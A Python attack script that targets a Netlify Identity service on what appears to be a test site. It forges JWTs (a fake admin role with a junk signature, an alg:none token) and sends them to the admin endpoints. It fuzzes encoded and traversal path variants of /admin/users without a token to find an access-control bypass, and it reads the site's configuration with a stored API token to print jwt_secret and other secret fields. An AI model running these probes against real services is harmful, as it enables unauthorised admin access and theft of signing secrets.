# -*- coding: utf-8 -*-
# _idn_jwt_probe.py - fake JWT acceptance test + edge path bypass fuzz + full site read
import json, base64, urllib.request, urllib.error
from _net_creds import TOKEN_A, SITE_A

HOST = 'https://sec-test-rcf6lz.netlify.app/.netlify/identity'

def b64u(s):
    return base64.urlsafe_b64encode(s).rstrip(b'=')

def make_jwt(payload, sig=b'x'):
    h = b64u(json.dumps({'alg': 'HS256', 'typ': 'JWT'}).encode())
    p = b64u(json.dumps(payload).encode())
    s = b64u(sig)
    return (h + b'.' + p + b'.' + s).decode()

def req(method, url, body=None, tok=None, ct='application/json'):
    hdrs = {}
    if tok: hdrs['Authorization'] = 'Bearer ' + tok
    data = None
    if body is not None:
        hdrs['Content-Type'] = ct
        if isinstance(body, bytes):
            data = body
        else:
            data = json.dumps(body).encode() if isinstance(body, (dict, list)) else body.encode()
    r = urllib.request.Request(url, method=method, headers=hdrs, data=data)
    try:
        resp = urllib.request.urlopen(r, timeout=25)
        return resp.status, resp.headers.get('content-type',''), resp.read(1200).decode('utf-8','replace')
    except urllib.error.HTTPError as e:
        return e.code, e.headers.get('content-type',''), e.read(1200).decode('utf-8','replace')
    except Exception as e:
        return 'ERR', '', str(e)[:150]

print('=== 1. fake JWT payloads against admin/user endpoints (signature check depth) ===')
jwts = {
    'role-admin': make_jwt({'role': 'admin', 'sub': 'x', 'exp': 9999999999, 'iat': 1}),
    'empty': make_jwt({}),
    'alg-none': (b64u(json.dumps({'alg': 'none'}).encode()) + b'.' + b64u(json.dumps({'role': 'admin'}).encode()) + b'.').decode(),
}
for name, t in jwts.items():
    for p in ('/admin/settings', '/admin', '/user'):
        st, ct, b = req('GET', HOST + p, tok=t)
        print('%-10s %-16s -> %s %s' % (name, p, st, b[:120].replace('\n',' ')))

print()
print('=== 2. edge path bypass fuzz on admin/users (no token; 200/401=bypass, 404html=blocked) ===')
paths = [
    '/.netlify/identity/admin/users', '/.netlify/identity/admin/users/',
    '/.netlify/identity/admin%2fusers', '/.netlify/identity/admin/./users',
    '/.netlify/identity/ADMIN/users', '/.netlify/identity//admin/users',
    '/.netlify/identity/admin//users', '/.netlify/identity/admin/users/..',
    '/.netlify/identity/admin/users%3f', '/.netlify/identity/admin/users.json',
    '/.netlify/identity/admin%2Fusers', '/.netlify/identity/admin/users;',
    '/.netlify/identity/admin/users%00', '/.netlify/identity/admin/user',
    '/.netlify/identity/admin/tokens', '/.netlify/identity/admin/generate_link',
    '/.netlify/identity/admin/users?page=1', '/.netlify/identity/admin/users/page',
    '/.netlify/identity/admin/settings/users', '/.netlify/identity/admin/logout',
]
for p in paths:
    st, ct, b = req('GET', HOST + p)
    if st != 404:
        print('%-52s -> %s %s %s' % (p, st, ct[:20], b[:100].replace('\n',' ')))
    else:
        print('%-52s -> 404 html(blocked)' % p)

print()
print('=== 3. full site read (jwt_secret etc, proper parsing) ===')
st, ct, b = req('GET', 'https://api.netlify.com/api/v1/sites/%s' % SITE_A, tok=TOKEN_A)
try:
    j = json.loads(b)
    for k in sorted(j.keys()):
        v = str(j[k])
        if any(s in k.lower() for s in ('identity', 'jwt', 'secret', 'id_domain')):
            print('  %s = %s' % (k, v[:300]))
except Exception as e:
    print('  err', e)
